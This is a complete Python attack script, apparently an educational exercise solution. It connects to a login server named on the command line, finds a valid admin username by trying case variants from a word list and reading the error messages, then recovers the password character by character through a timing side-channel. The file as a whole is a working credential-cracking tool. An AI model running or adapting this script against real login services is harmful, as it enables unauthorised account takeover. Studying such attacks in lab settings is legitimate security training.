import socket
import sys
import json
import time

def send_login(client_socket, id, pw):
    login = {}
    login["login"] = id
    login["password"] = pw
    login = json.dumps(login)
    client_socket.send(login.encode())
    response = client_socket.recv(1024)
    response = response.decode()
    response = json.loads(response)
    return response["result"]

def build_idv(index, pw, sendlist):
    if index == len(pw):
        sendlist.append(pw)
        return

    low = pw[index].lower()
    up = pw[index].upper()

    if index == len(pw) - 1:
        bef = pw[:len(pw) - 1]
        build_idv(index + 1, bef + low, sendlist)
        if low != up:
            build_idv(index + 1, bef + up, sendlist)
        return

    if index == 0:
        aft = pw[index + 1:]
        build_idv(index + 1, low + aft, sendlist)
        if low != up:
            build_idv(index + 1, up + aft, sendlist)
        return

    bef = pw[0:index]
    aft = pw[index + 1:]
    build_idv(index + 1, bef + low + aft, sendlist)
    if low != up:
        build_idv(index + 1, bef + up + aft, sendlist)

def search_admin(client_socket, adminlist):
    for id in adminlist:
        id = id.strip("\n")
        sendlist = []
        build_idv(0, id, sendlist)
        for idv in sendlist:
            if send_login(client_socket, idv, " ") == "Wrong password!":
               return idv

def search_pw(client_socket, id):
    pw = ""
    while True:
        maxtime = -1
        maxchar = ""
        for char in "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789":
            start = time.perf_counter()
            if send_login(client_socket, id, pw + char) == "Connection success!":
                return pw + char
            end = time.perf_counter()
            if end - start > maxtime:
                maxtime = end - start
                maxchar = char
        pw += maxchar
          
   
hostname = sys.argv[1]
port = int(sys.argv[2])

file = open("logins.txt")
adminlist = file.readlines()
file.close()

with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)
    admin = search_admin(client_socket, adminlist)
    pw = search_pw(client_socket, admin)
    login = {}
    login["login"] = admin
    login["password"] = pw
    login = json.dumps(login)
    print(login)
